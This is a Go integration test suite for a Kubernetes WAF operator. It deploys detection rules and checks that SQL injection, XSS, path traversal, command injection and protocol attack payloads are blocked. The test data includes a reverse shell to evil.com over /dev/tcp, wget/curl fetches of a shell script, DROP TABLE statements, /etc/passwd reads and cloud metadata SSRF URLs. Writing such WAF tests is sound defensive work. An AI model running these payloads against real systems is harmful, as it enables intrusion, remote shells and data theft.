//go:build integration

/*
Copyright Coraza Kubernetes Operator contributors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package integration

import (
	"net/http"
	"net/url"
	"testing"

	"github.com/networking-incubator/coraza-kubernetes-operator/test/framework"
)

// TestSQLInjectionPatterns tests various SQL injection attack patterns
// to verify WAF detection capabilities.
func TestSQLInjectionPatterns(t *testing.T) {
	t.Parallel()
	s := fw.NewScenario(t)

	ns := s.GenerateNamespace("sqli-patterns")

	s.Step("create gateway")
	s.CreateGateway(ns, "gw")
	s.ExpectGatewayProgrammed(ns, "gw")

	s.Step("deploy SQL injection detection rules")
	s.CreateRuleSource(ns, "base-rules", `SecRuleEngine On
SecDebugLogLevel 9
SecDebugLog /dev/stdout
SecRequestBodyAccess On`)

	// Comprehensive SQLi detection rules
	s.CreateRuleSource(ns, "sqli-rules", `
# Union-based SQLi
SecRule ARGS "@rx (?i:union\s+(all\s+)?select)" "id:13001,phase:2,deny,status:403,msg:'Union-based SQLi',log,auditlog"

# Classic SQLi patterns
SecRule ARGS "@rx (?i:'\s*(or|and)\s*('|\"|\d|true|false))" "id:13002,phase:2,deny,status:403,msg:'Classic SQLi',log,auditlog"

# Stacked queries
SecRule ARGS "@rx ;\s*(?i:select|insert|update|delete|drop|create|alter)" "id:13003,phase:2,deny,status:403,msg:'Stacked query SQLi',log,auditlog"

# Comment-based bypass
SecRule ARGS "@rx (?i:/\*.*\*/|--\s*$|#\s*$)" "id:13004,phase:2,deny,status:403,msg:'Comment-based SQLi',log,auditlog"

# Encoded SQLi
SecRule ARGS "@rx (?i:%27|%22|%3B|%2D%2D)" "id:13005,phase:2,deny,status:403,msg:'Encoded SQLi',log,auditlog"

# Time-based blind SQLi
SecRule ARGS "@rx (?i:(sleep|benchmark|waitfor)\s*\()" "id:13006,phase:2,deny,status:403,msg:'Time-based SQLi',log,auditlog"
`)
	s.CreateRuleSet(ns, "ruleset", []string{"base-rules", "sqli-rules"})

	s.CreateEngine(ns, "engine", framework.EngineOpts{
		RuleSetName: "ruleset",
		GatewayName: "gw",
	})
	s.ExpectEngineReady(ns, "engine")

	s.CreateEchoBackend(ns, "echo")
	s.CreateHTTPRoute(ns, "route", "gw", "echo")

	gw := s.ProxyToGateway(ns, "gw")

	testCases := []struct {
		name    string
		payload string
	}{
		{"union_select", "1 UNION SELECT * FROM users"},
		{"union_all_select", "1 UNION ALL SELECT password FROM admin"},
		{"or_true", "' OR '1'='1"},
		{"or_numeric", "' OR 1=1--"},
		{"and_false", "' AND '1'='2"},
		{"stacked_select", "1; SELECT * FROM users"},
		{"stacked_drop", "1; DROP TABLE users"},
		{"comment_dash", "admin'--"},
		{"comment_hash", "admin'#"},
		{"comment_block", "admin'/**/"},
		{"sleep_function", "1' AND SLEEP(5)--"},
		{"benchmark", "1' AND BENCHMARK(1000000,SHA1('test'))--"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			path := "/?input=" + url.QueryEscape(tc.payload)
			gw.ExpectStatus(path, http.StatusForbidden)
		})
	}

	s.Step("verify safe queries pass")
	gw.ExpectAllowed("/?search=hello+world")
	gw.ExpectAllowed("/?id=12345")
	gw.ExpectAllowed("/?name=John+Doe")
}

// TestXSSPatterns tests various XSS attack patterns
// to verify WAF detection capabilities.
func TestXSSPatterns(t *testing.T) {
	t.Parallel()
	s := fw.NewScenario(t)

	ns := s.GenerateNamespace("xss-patterns")

	s.Step("create gateway")
	s.CreateGateway(ns, "gw")
	s.ExpectGatewayProgrammed(ns, "gw")

	s.Step("deploy XSS detection rules")
	s.CreateRuleSource(ns, "base-rules", `SecRuleEngine On
SecDebugLogLevel 9
SecDebugLog /dev/stdout
SecRequestBodyAccess On`)

	s.CreateRuleSource(ns, "xss-rules", `
# Script tags
SecRule ARGS "@rx (?i:<script[^>]*>)" "id:13101,phase:2,deny,status:403,msg:'Script tag XSS',log,auditlog"

# Event handlers
SecRule ARGS "@rx (?i:on(load|error|click|mouseover|mouseout|mousedown|mouseup|focus|blur|change|submit|keydown|keyup|keypress)\s*=)" "id:13102,phase:2,deny,status:403,msg:'Event handler XSS',log,auditlog"

# JavaScript protocol
SecRule ARGS "@rx (?i:javascript\s*:)" "id:13103,phase:2,deny,status:403,msg:'JavaScript protocol XSS',log,auditlog"

# Data URI with script
SecRule ARGS "@rx (?i:data\s*:.*script)" "id:13104,phase:2,deny,status:403,msg:'Data URI XSS',log,auditlog"

# SVG with script
SecRule ARGS "@rx (?i:<svg[^>]*onload)" "id:13105,phase:2,deny,status:403,msg:'SVG XSS',log,auditlog"

# IMG tag with onerror
SecRule ARGS "@rx (?i:<img[^>]*onerror)" "id:13106,phase:2,deny,status:403,msg:'IMG onerror XSS',log,auditlog"

# Iframe injection
SecRule ARGS "@rx (?i:<iframe[^>]*>)" "id:13107,phase:2,deny,status:403,msg:'Iframe XSS',log,auditlog"
`)
	s.CreateRuleSet(ns, "ruleset", []string{"base-rules", "xss-rules"})

	s.CreateEngine(ns, "engine", framework.EngineOpts{
		RuleSetName: "ruleset",
		GatewayName: "gw",
	})
	s.ExpectEngineReady(ns, "engine")

	s.CreateEchoBackend(ns, "echo")
	s.CreateHTTPRoute(ns, "route", "gw", "echo")

	gw := s.ProxyToGateway(ns, "gw")

	testCases := []struct {
		name    string
		payload string
	}{
		{"script_tag", "<script>alert(1)</script>"},
		{"script_src", "<script src='evil.js'></script>"},
		{"onload", "<body onload='alert(1)'>"},
		{"onerror", "<img src=x onerror='alert(1)'>"},
		{"onclick", "<div onclick='alert(1)'>click</div>"},
		{"onmouseover", "<a onmouseover='alert(1)'>hover</a>"},
		{"javascript_href", "<a href='javascript:alert(1)'>link</a>"},
		{"svg_onload", "<svg onload='alert(1)'>"},
		{"iframe", "<iframe src='http://evil.com'></iframe>"},
		{"data_uri", "data:text/html,<script>alert(1)</script>"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			path := "/?input=" + url.QueryEscape(tc.payload)
			gw.ExpectStatus(path, http.StatusForbidden)
		})
	}

	s.Step("verify safe HTML passes")
	gw.ExpectAllowed("/?content=Hello+World")
	gw.ExpectAllowed("/?html=<p>Paragraph</p>") // Simple HTML without scripts
}

// TestPathTraversal tests path traversal attack patterns.
func TestPathTraversal(t *testing.T) {
	t.Parallel()
	s := fw.NewScenario(t)

	ns := s.GenerateNamespace("path-traversal")

	s.Step("create gateway")
	s.CreateGateway(ns, "gw")
	s.ExpectGatewayProgrammed(ns, "gw")

	s.Step("deploy path traversal detection rules")
	s.CreateRuleSource(ns, "base-rules", `SecRuleEngine On
SecDebugLogLevel 9
SecDebugLog /dev/stdout`)

	s.CreateRuleSource(ns, "traversal-rules", `
# Basic path traversal
SecRule REQUEST_URI|ARGS "@rx \.\.(\/|\\\\|%5[cC])" "id:13201,phase:1,deny,status:403,msg:'Path traversal',log,auditlog"

# Encoded path traversal
SecRule REQUEST_URI|ARGS "@rx (%2e%2e%2f|%2e%2e/|\.\.%2f|%2e%2e%5c)" "id:13202,phase:1,deny,status:403,msg:'Encoded path traversal',log,auditlog"

# Null byte injection
SecRule REQUEST_URI|ARGS "@rx %00" "id:13203,phase:1,deny,status:403,msg:'Null byte injection',log,auditlog"

# Sensitive file access
SecRule REQUEST_URI "@rx (?i:(etc/passwd|etc/shadow|\.htaccess|web\.config|wp-config))" "id:13204,phase:1,deny,status:403,msg:'Sensitive file access',log,auditlog"
`)
	s.CreateRuleSet(ns, "ruleset", []string{"base-rules", "traversal-rules"})

	s.CreateEngine(ns, "engine", framework.EngineOpts{
		RuleSetName: "ruleset",
		GatewayName: "gw",
	})
	s.ExpectEngineReady(ns, "engine")

	s.CreateEchoBackend(ns, "echo")
	s.CreateHTTPRoute(ns, "route", "gw", "echo")

	gw := s.ProxyToGateway(ns, "gw")

	testCases := []struct {
		name string
		path string
	}{
		{"basic_traversal", "/?file=../../../etc/passwd"},
		{"double_traversal", "/?file=....//....//etc/passwd"},
		{"absolute_path", "/?file=/etc/passwd"},
		{"windows_traversal", "/?file=..%5C..%5Cwindows%5Csystem32"},
		{"htaccess", "/.htaccess"},
		{"wp_config", "/wp-config.php"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			gw.ExpectStatus(tc.path, http.StatusForbidden)
		})
	}

	s.Step("verify safe paths pass")
	gw.ExpectAllowed("/api/users")
	gw.ExpectAllowed("/static/images/logo.png")
	gw.ExpectAllowed("/?file=document.pdf")
}

// TestCommandInjection tests command injection attack patterns.
func TestCommandInjection(t *testing.T) {
	t.Parallel()
	s := fw.NewScenario(t)

	ns := s.GenerateNamespace("cmd-injection")

	s.Step("create gateway")
	s.CreateGateway(ns, "gw")
	s.ExpectGatewayProgrammed(ns, "gw")

	s.Step("deploy command injection detection rules")
	s.CreateRuleSource(ns, "base-rules", `SecRuleEngine On
SecDebugLogLevel 9
SecDebugLog /dev/stdout
SecRequestBodyAccess On`)

	s.CreateRuleSource(ns, "cmdi-rules", `
# Command separators
SecRule ARGS "@rx [;|&`+"`"+`$]" "id:13301,phase:2,deny,status:403,msg:'Command separator',log,auditlog"

# Command substitution
SecRule ARGS "@rx \$\([^)]+\)" "id:13302,phase:2,deny,status:403,msg:'Command substitution',log,auditlog"

# Common commands
SecRule ARGS "@rx (?i:(cat|ls|id|whoami|uname|pwd|wget|curl|nc|netcat)\s)" "id:13303,phase:2,deny,status:403,msg:'Common command',log,auditlog"

# Reverse shell patterns
SecRule ARGS "@rx (?i:(/bin/(ba)?sh|/dev/tcp|mkfifo))" "id:13304,phase:2,deny,status:403,msg:'Reverse shell',log,auditlog"
`)
	s.CreateRuleSet(ns, "ruleset", []string{"base-rules", "cmdi-rules"})

	s.CreateEngine(ns, "engine", framework.EngineOpts{
		RuleSetName: "ruleset",
		GatewayName: "gw",
	})
	s.ExpectEngineReady(ns, "engine")

	s.CreateEchoBackend(ns, "echo")
	s.CreateHTTPRoute(ns, "route", "gw", "echo")

	gw := s.ProxyToGateway(ns, "gw")

	testCases := []struct {
		name    string
		payload string
	}{
		{"semicolon", "test; cat /etc/passwd"},
		{"pipe", "test | id"},
		{"ampersand", "test && whoami"},
		{"backtick", "test `id`"},
		{"dollar_paren", "test $(whoami)"},
		{"cat_command", "cat /etc/passwd"},
		{"wget", "wget http://evil.com/shell.sh"},
		{"curl", "curl http://evil.com/shell.sh"},
		{"reverse_shell", "/bin/bash -i >& /dev/tcp/evil.com/4444 0>&1"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			path := "/?cmd=" + url.QueryEscape(tc.payload)
			gw.ExpectStatus(path, http.StatusForbidden)
		})
	}

	s.Step("verify safe inputs pass")
	gw.ExpectAllowed("/?input=hello")
	gw.ExpectAllowed("/?name=John")
}

// TestProtocolAttacks tests various protocol-level attacks.
func TestProtocolAttacks(t *testing.T) {
	t.Parallel()
	s := fw.NewScenario(t)

	ns := s.GenerateNamespace("protocol-attacks")

	s.Step("create gateway")
	s.CreateGateway(ns, "gw")
	s.ExpectGatewayProgrammed(ns, "gw")

	s.Step("deploy protocol attack detection rules")
	s.CreateRuleSource(ns, "base-rules", `SecRuleEngine On
SecDebugLogLevel 9
SecDebugLog /dev/stdout`)

	s.CreateRuleSource(ns, "protocol-rules", `
# HTTP response splitting
SecRule ARGS "@rx (%0d%0a|%0d|%0a|\r\n|\r|\n)" "id:13401,phase:2,deny,status:403,msg:'HTTP response splitting',log,auditlog"

# LDAP injection
SecRule ARGS "@rx (?i:\)|\(|\*|\\\\)" "id:13402,phase:2,deny,status:403,msg:'LDAP injection',log,auditlog"

# XML injection
SecRule ARGS "@rx (?i:<!ENTITY|<!DOCTYPE|<!\[CDATA\[)" "id:13403,phase:2,deny,status:403,msg:'XML injection',log,auditlog"

# SSRF patterns
SecRule ARGS "@rx (?i:(127\.0\.0\.1|localhost|0\.0\.0\.0|169\.254\.))" "id:13404,phase:2,deny,status:403,msg:'SSRF attempt',log,auditlog"

# File inclusion
SecRule ARGS "@rx (?i:(file://|php://|expect://|data://text))" "id:13405,phase:2,deny,status:403,msg:'File inclusion',log,auditlog"
`)
	s.CreateRuleSet(ns, "ruleset", []string{"base-rules", "protocol-rules"})

	s.CreateEngine(ns, "engine", framework.EngineOpts{
		RuleSetName: "ruleset",
		GatewayName: "gw",
	})
	s.ExpectEngineReady(ns, "engine")

	s.CreateEchoBackend(ns, "echo")
	s.CreateHTTPRoute(ns, "route", "gw", "echo")

	gw := s.ProxyToGateway(ns, "gw")

	testCases := []struct {
		name    string
		payload string
	}{
		{"crlf_injection", "test%0d%0aSet-Cookie: evil=value"},
		{"ldap_wildcard", "(uid=*)"},
		{"xml_entity", "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"},
		{"ssrf_localhost", "http://127.0.0.1/admin"},
		{"ssrf_metadata", "http://169.254.169.254/latest/meta-data/"},
		{"file_protocol", "file:///etc/passwd"},
		{"php_filter", "php://filter/convert.base64-encode/resource=index.php"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			path := "/?url=" + url.QueryEscape(tc.payload)
			gw.ExpectStatus(path, http.StatusForbidden)
		})
	}

	s.Step("verify safe URLs pass")
	gw.ExpectAllowed("/?url=https://example.com/page")
	gw.ExpectAllowed("/?callback=myFunction")
}
